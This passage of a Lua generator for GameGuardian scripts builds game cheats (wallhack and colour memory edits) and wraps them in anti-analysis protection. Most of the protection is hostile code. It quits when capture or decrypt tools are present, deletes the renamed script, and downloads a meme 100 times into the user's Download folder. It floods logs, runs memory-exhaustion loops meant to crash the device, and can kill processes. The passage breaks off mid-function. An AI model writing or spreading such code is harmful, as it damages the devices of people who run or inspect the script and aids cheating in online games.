    gg.searchNumber("206D;3.7615819e-37;2;-1;1",16,false,536870912,0,-1)
    gg.searchNumber("2",16,false,536870912,0,-1)
    gg.getResults(10)
    gg.editAll("130",16)
    gg.toast("WH 845 On")
    gg.clearResults()
  end
  function red()
    gg.clearResults()
    gg.searchNumber("8,196D;8,192D;8,200D::",4,false,536870912,0,-1)
    gg.searchNumber("8200",4,false,536870912,0,-1)
    gg.getResults(10)
    gg.editAll("7",4)
    gg.toast("Red On")
  end
  function white()
    gg.clearResults()
    gg.setRanges(gg.REGION_BAD)
    gg.searchNumber("256;8200;26",gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0,-1)
    gg.searchNumber("8200",gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(5)
    gg.editAll("5",gg.TYPE_DWORD)
    gg.toast("white On")
  end
  function yellow()
    gg.clearResults()
    gg.searchNumber("8,196D;8,192D;8,200D::",4,false,536870912,0,-1)
    gg.searchNumber("8200",4,false,536870912,0,-1)
    gg.getResults(10)
    gg.editAll("6",4)
    gg.toast("Yellow ON")
  end
  function exit()
    print("LONGSHOOR ESPORT")
    print("Banned anda kurang Tamvan")
    gg.toast("Thanks For Using Me\n banned anda kurang tamvan")
    os.exit()
  end
  
]])

local file = io.open(g.out, "a")
    if file then
        file:write(FAKE)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
end
end

 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 if g.info[22] == true then
VIEW = [[
if true then
    local org = gg.searchNumber
    local hook = function(...)
        gg.setVisible(false)
        local ret = org(...)
        if gg.isVisible() then
        gg.alert("ANTI VIEW CODE😂")
        gg.clearResults()
            while true do os.exit() end
        end
        return ret
    end
    gg.searchNumber = hook
end
]]
print('🛡ANTIVIEW  by Batman games : Sucess √ ')
local file = io.open(g.out, "a")
    if file then
        file:write(VIEW)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
end
end
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
if g.info[23] == true then
VPN = [[
gg.setVisible(false)
local API = "http://sikaran.whf.bz/VPN" 
    local response = gg.makeRequest(API)    
    if response.content then
        local content = response.content
        print(content)
        if content:find("┇ VPN Or Proxy Detected, Please Disable And Try Again !") then
         while true do gg.alert("⛔ 𝗩𝗣𝗡 𝗔𝗡𝗗 𝗣𝗥𝗢𝗫𝗬 𝗗𝗘𝗧𝗘𝗖𝗧𝗜𝗢𝗡 ⛔") os.exit() end
        elseif content:find("┇ Failed To Parse Api Response, Please Try Again Later !") then
           while true do gg.alert("⚠️ 𝗚𝗘𝗧 𝗔𝗣𝗜 𝗙𝗔𝗜𝗟𝗘𝗗 ⚠️") os.exit()  end
        end
        end
]]
print('🛡anti VPN  : Sucess √ ')
local file = io.open(g.out, "a")
    if file then
        file:write(VPN)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
end
end
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local DecToBase32 = '0123456789ABCDEFGHIJKLMNOPQRSTUV'

function enc32(S)
    local T = {}
    local j = 1
    for i = 1, #S do
        local B = S:byte(i)
        local high = math.floor(B / 32) + 1
        local low = (B % 32) + 1
        T[j] = DecToBase32:sub(high, high)
        T[j + 1] = DecToBase32:sub(low, low)
        j = j + 2
    end
    return table.concat(T)
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local descript_code = [[

os.remove("/sdcard/Notes")

  if gg.isPackageInstalled("com.fan.ggluadec") or gg.isPackageInstalled("com.fan.ggxxls") or gg.isPackageInstalled("com.fan.ggxxls-1.10") then
  os.exit()
end

if gg.isPackageInstalled("com.chenlun.autumncloudlua") then
  os.exit()
end

if gg.isPackageInstalled("com.maggienorth.max.postdata") then
  os.exit()
end

  if gg.isPackageInstalled("com.goushi.gtpcanary") then
  print("Packet Capture detect")
  os.exit()
end
if gg.isPackageInstalled("com.packagesniffer.frtparlak") then
  print("Packet Capture detect")
  os.exit()
end
if gg.isPackageInstalled("app.greyshirts.sslcapture") then
  print("Packet Capture detect")
  os.exit()
end

if gg.isPackageInstalled("com.minhui.networkcapture") then
  print("Desinstale o Packet Capture")
  os.exit()
end

if gg.isPackageInstalled("com.minhui.wifianalyzer") then
  print("Packet Capture detect")
  os.exit()
end
if gg.isPackageInstalled("jp.co.taosoftware.android.packetcapture") then
  print("Packet Capture detect")
  os.exit()
end
if gg.isPackageInstalled("com.prabalgaming.logger") then
print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("frtparlak.rootsniffer") then
  print("Packet Capture detect")
  os.exit()
end

if gg.isPackageInstalled("any_.body_.can_.fuck_.tencent_") then
  print("GG LOG detect")
  os.exit()
end

if gg.isPackageInstalled("com.rjvsbmhdspmnfbame") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.redwolfgaming.ripgg") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.vrexqfftfsxekm.kl") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.nochqxpucsbldqqx") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.ghueczxrttlhgd") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.yy.qptvrjwerw.ghoex") then
  print("GG LOG detect")
  os.exit()
end

if gg.isPackageInstalled("com.Egypt.yuosseef") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.tssfjipkmrco") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.vip.paidhacksonly.mr.toxin") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.ioyysvgfsrig") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.mrteamz.id") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.jtbodgpqxox") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.ByGGXEZ") then
  print("GG LOG detect")
  os.exit()
end

if gg.isPackageInstalled("com.eidymumcghpfeeeavps") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.mod.iraq") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.dzelttwyuyyes") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.sxqa") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.xyyxgxfn") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.zgb") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.vnpqk") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.mwjvnwesbghkxbjznbwo") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.blackduty.gc") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.s.fyojrme") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.roxmemek") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.fhshwhpvqvruvjtu") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.fireongaming.fog") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.paranoiaworks.unicus.android.sse") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.raincitygaming.ggmod") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.pvt4u") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.nydpvsb.z.r.pkgh") then
  print("GG LOG detect")
  os.exit()
end

if gg.isPackageInstalled("com.gmsm") then
  print("GG LOG detect")
  os.exit()
end
if gg.isPackageInstalled("com.sudsjcqvvcmgutdjeg") then
  print("GG LOG detect")
  os.exit()
end

if gg.isPackageInstalled("com.coolfoolggfuckscript.tm") then
  print("GG LOG detect")
  os.exit()
end

if gg.isPackageInstalled("com.foxcyber.gg") then
  print("GG LOG detect")
  os.exit()
end

if gg.isPackageInstalled("com.hckeam.mjgql") then 
print("GG LOG detect")
os.exit()
end

if gg.isPackageInstalled("com.rgkttz.rausqwl") then 
print("GG LOG detect")
os.exit()
end

if gg.isPackageInstalled("com.tc") then
  print(" SSTOOL detect")
  os.exit()
end

if gg.isPackageInstalled("com.vip.sstool") then
  print(" SSTOOL detect")
  os.exit()
end

if gg.isPackageInstalled("sstool.mod.mafia") then
  print(" mafia???")
  os.exit()
end

if gg.isPackageInstalled("sstool.only.com.sstool") then
  print(" SSTOOL detect")
  os.exit()
end

file,err=io.open("/sdcard/Android/data/com.aero.ss") 
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.decrypt.tool.by.joker.gg") 
jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
Link = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQv6ctApDWsXvQT0MDDuYdJf0glNlUzpS6Hww&usqp=CAU"
      path = "/sdcard/"
      Name = "you_is_noob.png"
      Slapper = gg.makeRequest(Link).content
      io.open(path .. "/" ..Name ,"w"):write(Slapper)
      gg.alert("GG DECRYPT DETECTED")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.goushi.gtpcanary")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.packagesniffer.frtparlak")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/app.greyshirts.sslcapture")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.minhui.networkcapture")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.minhui.wifianalyzer")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/jp.co.taosoftware.android.packetcapture")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/frtparlak.rootsniffer")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/any_.body_.can_.fuck_.tencent_")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.s.fyojrme")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.rjvsbmhdspmnfbame")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.redwolfgaming.ripgg")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.vrexqfftfsxekm.kl")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.ghueczxrttlhgd")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.yy.qptvrjwerw.ghoex")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.nochqxpucsbldqqx")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.Egypt.yuosseef")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.tssfjipkmrco")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.vip.paidhacksonly.mr.toxin")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.mrteamz.id")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.jtbodgpqxox")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.mod.iraq")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.dzelttwyuyyes")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.sxqa")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.xyyxgxfn")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.vnpqk")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.mwjvnwesbghkxbjznbwo")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.blackduty.gc")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.s.fyojrme")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.roxmemek")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.fhshwhpvqvruvjtu")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.fireongaming.fog")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.paranoiaworks.unicus.android.sse")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.raincitygaming.ggmod")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.pvt4u")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.nydpvsb.z.r.pkgh")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.ioyysvgfsrig")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.gmsm")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.sudsjcqvvcmgutdjeg")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.coolfoolggfuckscript.tm")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.eidymumcghpfeeeavps")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.foxcyber.gg")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.zgb")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.hckeam.mjgql") 
jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.rgkttz.rausqwl") 
jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/sstool.only.com.sstool")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/LOGGGG.lua") 
jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/catch.Art.Tool.seatch")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.laallkxhtrnqncw")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.khoiscript.logger")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.kaoygxapp")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.SourceKonzlet")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("konzlet ???")
os.exit() 
elseif jg=="No such file or directory" then  
end

file,err=io.open("/sdcard/Android/data/com.ByGGXEZ")
  jg=err:match("%((.-)%)")
if jg=="Is a directory" then 
gg.alert("ERROR")
os.exit() 
elseif jg=="No such file or directory" then  
end

os.remove("/sdcard/Notes")

local DecToBase32 = '0123456789ABCDEFGHIJKLMNOPQRSTUV'

function garbage(S)
    local T = {}
    local j = 1
    for i = 1, #S, 2 do
        local char1 = S:sub(i, i)
        local char2 = S:sub(i + 1, i + 1)
        local index1 = DecToBase32:find(char1) - 1
        local index2 = DecToBase32:find(char2) - 1
        local byte = index1 * 32 + index2
        T[j] = string.char(byte)
        j = j + 1
    end
    return table.concat(T)
end

 YOU_IS_NOOB = gg.REGION_ANONYMOUS
 YOU_IS_NOOB1 = gg.REGION_ASHMEM
 YOU_IS_NOOB2 = gg.REGION_BAD
 YOU_IS_NOOB3 = gg.REGION_CODE_APP
 YOU_IS_NOOB4 = gg.REGION_CODE_SYS
 YOU_IS_NOOB5 = gg.REGION_C_ALLOC
 YOU_IS_NOOB6= gg.REGION_C_BSS
 YOU_IS_NOOB7 = gg.REGION_C_DATA
 YOU_IS_NOOB8 = gg.REGION_C_HEAP
 YOU_IS_NOOB9 = gg.REGION_JAVA
 YOU_IS_NOOB10 = gg.REGION_JAVA_HEAP
 YOU_IS_NOOB11 = gg.REGION_OTHER
 YOU_IS_NOOB12 = gg.REGION_PPSSPP
 YOU_IS_NOOB13 = gg.REGION_STACK
 YOU_IS_NOOB14 = gg.REGION_VIDEO
 YOU_IS_NOOB15 = gg.TYPE_AUTO
 YOU_IS_NOOB16 = gg.TYPE_BYTE
 YOU_IS_NOOB17 = gg.TYPE_DOUBLE
 YOU_IS_NOOB18 = gg.TYPE_DWORD
 YOU_IS_NOOB19 = gg.TYPE_FLOAT
 YOU_IS_NOOB20 = gg.TYPE_QWORD
 YOU_IS_NOOB21 = gg.TYPE_WORD
 YOU_IS_NOOB22 = gg.TYPE_XOR
 local a = gg
 local b = os
 local c  =string
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function A()
local your_name_script = "]]..checkk..[[" 
local getInfo = tostring(gg.getFile())

local filename = getInfo:match("^.+/(.+)$")

if filename then
    if filename == your_name_script then
        
    else
    gg.alert("Please do not rename or  using loadfile.")
   os.remove(filename)
 os.exit()
    end
else
    gg.alert("failed get info")
    os.exit()
end 
end
A()

function WriteFilesGay()
Link = "https://apimeme.com/meme?meme=FRANGO&top=you+is+&bottom=GAY"
  path = "/sdcard/Download/"
  Name = "gay.png"
      for i = 1, 100 do
      local newName = "gay" .. i .. ".png"
      local bat = gg.makeRequest(Link).content
      if bat == nil then
        os.exit()
      end
      local file = io.open(path .. newName, "w")
      if file then
        file:write(bat)
        file:close()
      else
        print("Erro")
    end
  end
  end
  
  function gu2()
 c = tostring(_ENV.gg)
for k in c:gmatch("%s[@]?(/.-):") do
if k ~= gg.getFile() then
WriteFilesGay()
end
end
end
gu2()

function Big_log()
  local BATMAN1 = string.rep("fuck you", 9999)
  local BATMAN = string.rep(BATMAN1, 99)
  for i = 1, 9999 do
    gg.refineAddress({[1] = BATMAN})
  end
  for i = 1, 9999 do
    gg.refineNumber({[1] = BATMAN})
  end
end

  function checkFunctions()
  local Lock = {
    debug.getinfo(gg.toast).short_src,
    debug.getinfo(gg.getResults).short_src,
    debug.getinfo(gg.getValues).short_src,
    debug.getinfo(os.exit).short_src,
    debug.getinfo(gg.refineNumber).short_src,
    debug.getinfo(gg.refineAddress).short_src,
    debug.getinfo(gg.alert).short_src
  }
  for i, v in pairs(Lock) do
    if v ~= "toast" and v ~= "getResults" and v ~= debug.getinfo(1).short_src and v ~= gg.getFile() then
      for i = 1, 999999999 do
        gg.toast(" BATMAN PROTECTION ")
      end
      return
    end
  end
end

function checkExecutionTime()
  local a = os.time()
  for i = 1, 100 do
    load("💩🥳 Im Corona Lol")
  end
  local b = os.time()
  if b - a > 5 then
    gg.alert("noob decrypt")
    os.exit() 
end
end

Big_log()
checkFunctions()
checkExecutionTime()

--for crash script 
local function ProcessSpam()

    local SpamTable = {}
    local counter, toStr = 0, tostring

    local function GenerateSequence()
        local result = ""
        while counter < 100 do
            result = result .. toStr(counter * counter)
            counter = counter + 1
        end
        return result
    end

local function complexLoop()
    local t = {}
    
    while true do
        for i = 1, 20000 do  
            t[i] = {}
            for j = 1, 200 do  
                t[i][j] = string.rep("B", 2048)  
            end
        end
        
        local tmp = 0
        for k, v in pairs(t) do
            tmp = tmp + #v[1]
        end
    end
end

local function createMassiveData()
    
    local t = {}
    
    while true do
             for i = 1, 100000 do
            t[i] = {}
            for j = 1, 200 do
                t[i][j] = string.rep("D", 8096)  
            end
        end
        local tmp = 0
        for k, v in pairs(t) do
            tmp = tmp + #v[1]
        end
         complexLoop() 
    end
end

while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end

	if true then
		if string.match('/' .. tostring(os.time()), '/([^/]+)$') ~= tostring(os.time()) then
			while true do
				if true then
				ProcessSpam()
					createMassiveData()
					antilog()
					os.exit()
				end
				if false then
				end
			end
		end
	end
	
	loadfile = loadfile
    load = load
    loadfile(gg.getFile()) 
    load(string.dump(load("os.exit()"),false,false)) 
    io.open(gg.getFile() .. "c" .. tostring(string.dump(loadfile(gg.getFile()),false,false)),"w") 

local function isFunctionSafe(func)
    local info = debug.getinfo(func)
    
    if type(func) == "function" and func ~= debug.getinfo then
        if info.short_src ~= "[Java]" or info.source ~= "=[Java]" or info.what ~= "Java" or
           info.namewhat ~= "" or info.linedefined ~= -1 or info.lastlinedefined ~= -1 or
           info.currentline ~= -1 or type(({pcall(debug.getlocal, func, 1)})[2]) == "string" then
            return false
        end
    elseif func == debug.getinfo then
        if type(({pcall(debug.getlocal, func, 1)})[2]) == "string" then
            return false
        end
    end
    return true
end

local function verifyLibraries()
    local libraries = {"gg", "os", "io", "debug", "math", "string", "table", "bit32", "utf8"}
    
    for _, lib in ipairs(libraries) do
        local init = _ENV[lib]
        if init and type(init) == "table" then
            for _, func in pairs(init) do
                if type(func) == "function" and not isFunctionSafe(func) then
                    return
                end
            end
        end
    end
end

local function additionalChecks()
    local Lock = {
        debug.getinfo(gg.toast).short_src,
        debug.getinfo(gg.getResults).short_src,
        debug.getinfo(gg.getValues).short_src,
        debug.getinfo(os.exit).short_src,
        debug.getinfo(gg.refineNumber).short_src,
        debug.getinfo(gg.refineAddress).short_src,
        debug.getinfo(gg.alert).short_src
    }
    for _, v in ipairs(Lock) do
        if v ~= "toast" and v ~= "getResults" and v ~= debug.getinfo(1).short_src and v ~= gg.getFile() then
            return
        end
    end
end

local function checkStringForAt(str)
    return str:find("@") ~= nil
end

verifyLibraries()
additionalChecks()

local libs = {tostring(gg), tostring(os), tostring(io), tostring(debug), tostring(math), tostring(table)}
for _, lib in ipairs(libs) do
    if checkStringForAt(lib) then
        os.exit()
        return
    end
end

if not debug.traceback or not gg.getFile then
    repeat
        os.exit()
    until false
    return
end

local c = os.clock()
if os.clock() - c > 0.80 then
    os.exit()
    return
end

if debug.getinfo(gg.searchNumber).what ~= 'Java' then
    os.exit()
    return
end

local funcX = function() end
local LockFinal = {
    debug.getinfo(gg.toast).short_src,
    debug.getinfo(gg.getResults).short_src,
    debug.getinfo(gg.getValues).short_src,
    debug.getinfo(os.exit).short_src,
    debug.getinfo(gg.refineNumber).short_src,
    debug.getinfo(gg.refineAddress).short_src,
    debug.getinfo(gg.alert).short_src,
    debug.getinfo(debug.getinfo).short_src,
    debug.getinfo(funcX).short_src
}

for _, v in ipairs(LockFinal) do
    if v ~= "toast" and v ~= "getResults" and v ~= debug.getinfo(1).short_src and v ~= "function() end" and v ~= gg.getFile() then
        os.exit()
        return
    end
end

local function isGGSearchNumberDefinition()
    local ggSearchNumberInfo = debug.getinfo(gg.searchNumber)
    if ggSearchNumberInfo == nil then
        return false
    end
    return ggSearchNumberInfo.func == gg.searchNumber
end

local function isGGEquivalentToStrGG()
    return string.format("%s", gg) == tostring(gg)
end

function checkHack()
    if not isGGSearchNumberDefinition() then
        while true do
        end
    end
    if not isGGEquivalentToStrGG() then
        local tostringPath = string.format("%s", tostring):match("@(.-):")
        if tostringPath and tostringPath:find("/lua/") then
            gg.alert("ERRO.","")
            os.exit()
        end
    end
end

    local function GenerateSpamName()
        local HashName = ""
        for i = 1, 10 do
            HashName = "ðŸŒ¨ï¸" .. HashName .. "â˜ƒï¸" .. HashName .. "â„ï¸"
        end
        return HashName:rep(100)
    end

    local function IsFunctionValid(env)
        for _, v in pairs(env) do
            if toStr(v):match("function: @.-:") then
                return false
            end
        end
        return true
    end
    
    local function ValidateFunctions()
        if not IsFunctionValid(_ENV) then
            return false
        end
        local func = os.exit
        if toStr(func):find("[-@/%d]") then
            return false
        end
        return true
    end
    
    local function RefineSpamData(tmp)
        for i = 1, #tmp do
            SpamTable[i] = {
                ["address"] = GenerateSpamName(),
                ["flags"] = GenerateSpamName(),
                ["value"] = GenerateSpamName(),
                ["freeze"] = GenerateSpamName(),
                ["name"] = GenerateSpamName(),
                SpamTable[i - 1]
            }
            gg.refineNumber(SpamTable)
            gg.refineAddress(SpamTable)
        end
    end
    
    local function PerformSafetyCheck()
        for _, funcGroup in ipairs({gg, os, io, debug, math, table}) do
            if _ENV["string"]["match"](tostring(funcGroup), "@") then
                gg.processKill()
                return
            end
        end

        if debug.getinfo(1).istailcall or debug.getinfo(gg.searchNumber).what ~= 'Java' then
            os.exit()
        end
    end

    local function ManageVisibility()
        local x = 0
        repeat
            x = x + 1
            gg.setVisible(false)
            gg.sleep(0)
            gg.setVisible(true)
            gg.sleep(2000)
        until x == 20000
    end

    local function ValidateSourceFile()
        local fileName = gg.getFile()
        local loadedFile = loadfile(fileName)
        if loadedFile ~= nil then
            local tempName = fileName:match("[^/]+$")
